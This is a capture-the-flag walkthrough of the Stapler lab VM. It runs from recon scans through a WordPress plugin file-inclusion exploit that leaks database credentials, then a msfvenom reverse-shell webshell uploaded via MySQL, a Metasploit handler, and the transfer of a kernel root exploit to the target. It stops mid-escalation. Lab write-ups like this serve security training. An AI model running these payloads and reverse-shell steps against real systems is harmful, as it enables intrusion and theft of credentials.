<!--# JT  -->

## Stapler: 1

i actually attended the session at London bsides when the workshop took place for this VM.

### info

```

+---------------------------------------------------------+
|                                                         |
|                                  __..--''\              |
|                          __..--''         \             |
|                  __..--''          __..--''             |
|          __..--''          __..--''       |             |
|          \ o        __..--''____....----""              |
|           \__..--''\                                    |
|           |         \                                   |
|          +----------------------------------+           |
|          +----------------------------------+           |
|                                                         |
+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|   Name: Stapler           |          IP: DHCP           |
|   Date: 2016-June-08      |        Goal: Get Root!      |
| Author: g0tmi1k           | Difficultly: ??? ;)         |
+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|                                                         |
| + Average beginner/intermediate VM, only a few twists   |
|   + May find it easy/hard (depends on YOUR background)  |
|   + ...also which way you attack the box                |
|                                                         |
| + It SHOULD work on both VMware and Virtualbox          |
|   + REBOOT the VM if you CHANGE network modes           |
|   + Fusion users, you'll need to retry when importing   |
|                                                         |
| + There are multiple methods to-do this machine         |
|   + At least two (2) paths to get a limited shell       |
|   + At least three (3) ways to get a root access        |
|                                                         |
| + Made for BsidesLondon 2016                            |
|   + Slides: https://download.vulnhub.com/media/stapler/ |
|                                                         |
| + Thanks g0tmi1k, nullmode, rasta_mouse & superkojiman  |
|   + ...and shout-outs to the VulnHub-CTF Team =)        |
|                                                         |
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+
|                                                         |
|       --[[~~Enjoy. Have fun. Happy Hacking.~~]]--       |
|                                                         |
+---------------------------------------------------------+


Slides: https://download.vulnhub.com/stapler/slides.pdf

```
### discovery

```
root@kali:~# netdiscover -r 192.168.93.128
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.93.1    00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.93.2    00:50:56:fe:26:a7      1      60  VMware, Inc.
 192.168.93.133  00:0c:29:dc:44:b0      1      60  VMware, Inc.
 192.168.93.254  00:50:56:ee:9f:ea      1      60  VMware, Inc.
```

### port scan

```
root@kali:~# nmap -sC -p- 192.168.93.133

Starting Nmap 7.01 ( https://nmap.org ) at 2016-06-27 01:09 BST
Nmap scan report for 192.168.93.133
Host is up (0.00072s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp    open   ssh
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
53/tcp    open   domain
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp    open   http
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
| mysql-info:
|   Protocol: 53
|   Version: .7.12-0ubuntu1
|   Thread ID: 6
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, Speaks41ProtocolOld, LongPassword, Speaks41ProtocolNew, SupportsTransactions, LongColumnFlag, DontAllowDatabaseTableColumn, ConnectWithDatabase, IgnoreSigpipes, InteractiveClient, SupportsLoadDataLocal, ODBCClient, SupportsCompression, Support41Auth
|   Status: Autocommit
|   Salt: \x0Ch\x1CbV\x02,M%\x18
|_\x17\x19p:z\x17P\x13\x1B
12380/tcp open   unknown
MAC Address: 00:0C:29:DC:44:B0 (VMware)

Host script results:
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED
|   Domain name:
|   FQDN: red
|_  System time: 2016-06-29T00:00:23+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Nmap done: 1 IP address (1 host up) scanned in 196.07 seconds
```

### port 12380

```
root@kali:~# amap 192.168.93.133 12380
amap v5.4 (www.thc.org/thc-amap) started at 2016-06-27 01:13:26 - APPLICATION MAPPING mode

Protocol on 192.168.93.133:12380/tcp matches http
Protocol on 192.168.93.133:12380/tcp matches http-apache-2
Protocol on 192.168.93.133:12380/tcp matches ntp
Protocol on 192.168.93.133:12380/tcp matches ssl

Unidentified ports: none.

amap v5.4 finished at 2016-06-27 01:13:32
```

nikto scan

```
root@kali:~# nikto -host https://192.168.93.133:12380/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.93.133
+ Target Hostname:    192.168.93.133
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2016-06-27 01:15:36 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Hostname '192.168.93.133' does not match certificate's names: Red.Initech
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7690 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2016-06-27 01:17:55 (GMT1) (139 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

/blogblog/ shows a wordpress site

```
root@kali:~# curl https://192.168.93.133:12380/blogblog/ --insecure -Ik
HTTP/1.1 200 OK
Date: Tue, 28 Jun 2016 23:06:21 GMT
Server: Apache/2.4.18 (Ubuntu)
X-Pingback: https://192.168.93.133:12380/blogblog/xmlrpc.php
Dave: Soemthing doesn't look right here
Content-Type: text/html; charset=UTF-8
```

```
<script type='text/javascript' src='https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/js/bootstrap.min.js?ver=20120205'></script>
<script type='text/javascript' src='https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/js/skip-link-focus-fix.js?ver=20130115'></script>
<script type='text/javascript' src='https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/js/jquery.meanmenu.min.js?ver=20130116'></script>
<script type='text/javascript' src='https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/js/jquery.easing.min.js?ver=20130117'></script>
<script type='text/javascript' src='https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/js/custom.js?ver=20130118'></script>
```

wpscan

```
root@kali:~# wpscan --url https://192.168.93.133:12380/blogblog/ --enumerate ap,at --batch
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: https://192.168.93.133:12380/blogblog/
[+] Started: Mon Jun 27 01:24:04 2016

[!] The WordPress 'https://192.168.93.133:12380/blogblog/readme.html' file exists exposing a version number
[+] Interesting header: DAVE: Soemthing doesn't look right here
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[!] Registration is enabled: https://192.168.93.133:12380/blogblog/wp-login.php?action=register
[+] XML-RPC Interface available under: https://192.168.93.133:12380/blogblog/xmlrpc.php
[!] Upload directory has directory listing enabled: https://192.168.93.133:12380/blogblog/wp-content/uploads/

[+] WordPress version 4.2.1 identified from advanced fingerprinting
[!] 21 vulnerabilities identified from the version number

[!] Title: WordPress 4.1-4.2.1 - Genericons Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7979
    Reference: https://codex.wordpress.org/Version_4.2.2
[i] Fixed in: 4.2.2

[!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8111
    Reference: https://wordpress.org/news/2015/07/wordpress-4-2-3/
    Reference: https://twitter.com/klikkioy/status/624264122570526720
    Reference: https://klikki.fi/adv/wordpress3.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
[i] Fixed in: 4.2.3

[!] Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8126
    Reference: https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Timing Side Channel Attack
    Reference: https://wpvulndb.com/vulnerabilities/8130
    Reference: https://core.trac.wordpress.org/changeset/33536
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8131
    Reference: https://core.trac.wordpress.org/changeset/33529
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8132
    Reference: https://core.trac.wordpress.org/changeset/33541
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8133
    Reference: https://core.trac.wordpress.org/changeset/33549
    Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8186
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - User List Table Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8187
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - Publish Post and Mark as Sticky Permission Issue
    Reference: https://wpvulndb.com/vulnerabilities/8188
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715
[i] Fixed in: 4.2.5

[!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8358
    Reference: https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
[i] Fixed in: 4.2.6

[!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8376
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36435
    Reference: https://hackerone.com/reports/110801
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
[i] Fixed in: 4.2.7

[!] Title: WordPress 3.7-4.4.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8377
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36444
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
[i] Fixed in: 4.2.7

[!] Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
    Reference: https://wpvulndb.com/vulnerabilities/8473
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
    Reference: https://wpvulndb.com/vulnerabilities/8474
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Script Compression Option CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8475
    Reference: https://codex.wordpress.org/Version_4.5
[i] Fixed in: 4.5

[!] Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8488
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
    Reference: https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
[i] Fixed in: 4.5.2

[!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
    Reference: https://wpvulndb.com/vulnerabilities/8489
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
    Reference: https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
    Reference: http://avlidienbrunn.com/wp_some_loader.php
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
[i] Fixed in: 4.2.8

[!] Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
    Reference: https://wpvulndb.com/vulnerabilities/8518
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
[i] Fixed in: 4.5.3

[!] Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
    Reference: https://wpvulndb.com/vulnerabilities/8519
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
    Reference: https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
[i] Fixed in: 4.5.3

[!] Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
    Reference: https://wpvulndb.com/vulnerabilities/8520
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
[i] Fixed in: 4.5.3

[+] WordPress theme in use: bhost - v1.2.9

[+] Name: bhost - v1.2.9
 |  Latest version: 1.2.9 (up to date)
 |  Location: https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/
 |  Readme: https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/readme.txt
 |  Style URL: https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/style.css
 |  Theme Name: BHost
 |  Theme URI: Author: Masum Billah
 |  Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This the...
 |  Author: Masum Billah
 |  Author URI: http://getmasum.net/

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating all plugins (may take a while and use a lot of system resources) ...

   Time: 00:08:57 <===================================================================================================> (60690 / 60690) 100.00% Time: 00:08:57

[+] We found 4 plugins:

[+] Name: advanced-video-embed-embed-videos-or-playlists - v1.0
 |  Latest version: 1.0 (up to date)
 |  Location: https://192.168.93.133:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 |  Readme: https://192.168.93.133:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
[!] Directory listing is enabled: https://192.168.93.133:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/

[+] Name: akismet
 |  Latest version: 3.1.11
 |  Location: https://192.168.93.133:12380/blogblog/wp-content/plugins/akismet/

[!] We could not determine a version so all vulnerabilities are printed out

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8215
    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5

[+] Name: shortcode-ui - v0.6.2
 |  Latest version: 0.6.2 (up to date)
 |  Location: https://192.168.93.133:12380/blogblog/wp-content/plugins/shortcode-ui/
 |  Readme: https://192.168.93.133:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
[!] Directory listing is enabled: https://192.168.93.133:12380/blogblog/wp-content/plugins/shortcode-ui/

[+] Name: two-factor
 |  Latest version: 0.1-dev-20160412
 |  Location: https://192.168.93.133:12380/blogblog/wp-content/plugins/two-factor/
 |  Readme: https://192.168.93.133:12380/blogblog/wp-content/plugins/two-factor/readme.txt
[!] Directory listing is enabled: https://192.168.93.133:12380/blogblog/wp-content/plugins/two-factor/

[+] Enumerating all themes (may take a while and use a lot of system resources) ...

   Time: 00:01:55 <===================================================================================================> (13139 / 13139) 100.00% Time: 00:01:55

[+] We found 1 themes:

[+] Name: bhost - v1.2.9
 |  Latest version: 1.2.9 (up to date)
 |  Location: https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/
 |  Readme: https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/readme.txt
 |  Style URL: https://192.168.93.133:12380/blogblog/wp-content/themes/bhost/style.css
 |  Theme Name: BHost
 |  Theme URI: Author: Masum Billah
 |  Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This the...
 |  Author: Masum Billah
 |  Author URI: http://getmasum.net/

[+] Finished: Mon Jun 27 01:37:38 2016
[+] Requests Done: 73888
[+] Memory used: 341.367 MB
[+] Elapsed time: 00:13:34
```

### exploit

looking at the `advanced-video-embed-embed-videos-or-playlists` plugin for exploits

```
root@kali:~# searchsploit advanced video -p --id 39646
Exploit: WordPress Advanced Video Plugin 1.0 - Local File Inclusion (LFI)
   Path: /usr/share/exploitdb/platforms/php/webapps/39646.py
```

amended the exploit to support SSL and added in our target URL

```
36 import ssl
39 ssl._create_default_https_context = ssl._create_unverified_context
40 url = "https://192.168.93.133:12380/blogblog" # insert url to wordpress
```

after running the exploit there is a new worpress post that looks like an image `https://192.168.93.133:12380/blogblog/?p=21`

further inspection shows that this exploit worked

```
root@kali:~# curl --insecure https://192.168.93.133:12380/blogblog/wp-content/uploads/198573974.jpeg
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

define('WP_HTTP_BLOCK_EXTERNAL', true);
```

using the credentials in the config file access to the mysql database is given

```
root@kali:~# mysql -uroot -pplbkac -h192.168.93.133
Warning: Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 32
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| loot               |
| mysql              |
| performance_schema |
| phpmyadmin         |
| proof              |
| sys                |
| wordpress          |
+--------------------+
8 rows in set (0.03 sec)
```

### payload

using msfvenom i create a payload and, i then converted this to a binary removing new lines

```
root@kali:~# msfvenom -p php/meterpreter/reverse_tcp -f raw --platform php -e generic/none -a php LHOST=192.168.93.128 LPORT=443 -o webshell.php && cat webshell.php | xxd -ps | tr -d '\n'

```
__i wont make you scroll through all of that__

now that the payload is in a usable format i then upload it to the database

```
mysql> select 0xall that stuff into outfile "/var/www/https/blogblog/wp-content/uploads/webshell.php";
```

### shell

set up the handler

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.93.128
lhost => 192.168.93.128
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > exploit -j
[*] Exploit running as background job.

```

launch the payload

`root@kali:~# curl --insecure https://192.168.93.133:12380/blogblog/wp-content/uploads/webshell.php`

new meterpter shell

```
[*] Sending stage (33721 bytes) to 192.168.93.133
[*] Meterpreter session 1 opened (192.168.93.128:443 -> 192.168.93.133:60374) at 2016-06-27 02:37:52 +0100
sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 2277 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

### escalation

check the kernel version

```
www-data@red:/$ uname -a
uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux

www-data@red:/$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04 LTS
Release:	16.04
Codename:	xenial
```

first check if there is a kernel exploit

```
root@kali:~# searchsploit Ubuntu 16.04
Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit |./linux/local/39772.txt
```

download the exploit from the exploitdb mirror

```
root@kali:~# wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
--2016-06-27 02:44:34--  https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
Resolving github.com (github.com)... 192.30.253.112, 192.30.253.112
Connecting to github.com (github.com)|192.30.253.112|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip [following]
--2016-06-27 02:44:35--  https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.16.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.16.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7115 (6.9K) [application/zip]
Saving to: ‘39772.zip’

39772.zip                               100%[=============================================================================>]   6.95K  --.-KB/s    in 0.001s

2016-06-27 02:44:35 (4.90 MB/s) - ‘39772.zip’ saved [7115/7115]

root@kali:~# unzip ./39772.zip
Archive:  ./39772.zip
   creating: 39772/
  inflating: 39772/.DS_Store
   creating: __MACOSX/
   creating: __MACOSX/39772/
  inflating: __MACOSX/39772/._.DS_Store
  inflating: 39772/crasher.tar
  inflating: __MACOSX/39772/._crasher.tar
  inflating: 39772/exploit.tar
  inflating: __MACOSX/39772/._exploit.tar
```
transfer to the victim

```
root@kali:~/39772# ip addr | grep eth0 && python -m SimpleHTTPServer 8080
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    inet 192.168.93.128/24 brd 192.168.93.255 scope global dynamic eth0
Serving HTTP on 0.0.0.0 port 8080 ...
192.168.93.133 - - [27/Jun/2016 02:46:32] "GET /exploit.tar HTTP/1.1" 200 -
```

```
www-data@red:/$ cd /tmp
cd /tmp
www-data@red:/tmp$ wget http://192.168.93.128:8080/exploit.tar
wget http://192.168.93.128:8080/exploit.tar
--2016-06-29 01:34:05--  http://192.168.93.128:8080/exploit.tar
Connecting to 192.168.93.128:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-tar]
Saving to: 'exploit.tar'

exploit.tar         100%[===================>]  20.00K  --.-KB/s    in 0s

2016-06-29 01:34:05 (45.1 MB/s) - 'exploit.tar' saved [20480/20480]

```

compile and running the exploit

```
www-data@red:/tmp$ tar xvf ./exploit.tar
tar xvf ./exploit.tar
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
www-data@red:/tmp$ cd ebpf_mapfd_doubleput_exploit/
